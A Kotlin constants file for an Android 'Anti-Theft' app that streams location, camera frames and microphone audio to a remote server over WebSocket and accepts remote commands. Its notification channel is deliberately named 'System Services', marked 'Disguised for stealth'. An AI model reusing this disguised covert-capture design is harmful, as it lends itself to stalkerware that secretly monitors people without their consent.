package com.antitheft.utils

/**
 * Constants for the Anti-Theft application
 * Centralizes all configuration values, endpoints, and settings
 */
object Constants {
    // Shared Preferences
    const val PREFS_NAME = "anti_theft_prefs"
    const val KEY_SERVER_URL = "server_url"
    const val KEY_SERVER_PORT = "server_port"
    const val KEY_AUTH_TOKEN = "auth_token"
    const val KEY_DEVICE_ID = "device_id"

    // WorkManager
    const val WORK_NAME_CHECK_IN = "check_in_work"
    const val CHECK_IN_INTERVAL_MINUTES = 15L  // WorkManager enforces 15-min minimum for PeriodicWorkRequest; rapid polling uses OneTimeWorkRequest instead

    // Notification - Disguised for stealth
    const val NOTIFICATION_CHANNEL_ID = "system_service_channel"
    const val NOTIFICATION_CHANNEL_NAME = "System Services"
    const val NOTIFICATION_CHANNEL_DESCRIPTION = "Background system services"
    const val NOTIFICATION_ID = 1001

    // Network
    const val CONNECT_TIMEOUT_SECONDS = 10L
    const val READ_TIMEOUT_SECONDS = 10L
    const val WEBSOCKET_RECONNECT_DELAY_MS = 5000L
    const val MAX_RECONNECT_ATTEMPTS = 10

    // Media - Video
    const val VIDEO_WIDTH = 640
    const val VIDEO_HEIGHT = 480
    const val VIDEO_FPS = 15
    const val JPEG_QUALITY = 75

    // Media - Audio
    const val AUDIO_SAMPLE_RATE = 16000
    const val AUDIO_CHANNEL = android.media.AudioFormat.CHANNEL_IN_MONO
    const val AUDIO_ENCODING = android.media.AudioFormat.ENCODING_PCM_16BIT
    const val AUDIO_BUFFER_SIZE_MS = 160

    // Location
    const val LOCATION_UPDATE_INTERVAL_MS = 30000L  // 30 seconds
    const val LOCATION_FASTEST_INTERVAL_MS = 10000L  // 10 seconds

    // API Endpoints
    const val ENDPOINT_CHECK_IN = "/api/check-in"
    const val ENDPOINT_STATUS = "/api/status"
    const val ENDPOINT_ACTIVATE = "/api/activate"
    const val ENDPOINT_DEACTIVATE = "/api/deactivate"

    // WebSocket
    const val WS_PATH = "/ws"

    // Message Types
    const val MSG_TYPE_REGISTER = "register"
    const val MSG_TYPE_LOCATION = "location"
    const val MSG_TYPE_VIDEO = "video_frame"
    const val MSG_TYPE_AUDIO = "audio_chunk"
    const val MSG_TYPE_STATUS = "status"
    const val MSG_TYPE_COMMAND = "command"

    // Client Type
    const val CLIENT_TYPE_DEVICE = "device"
    const val CLIENT_TYPE_WEB = "web"
}
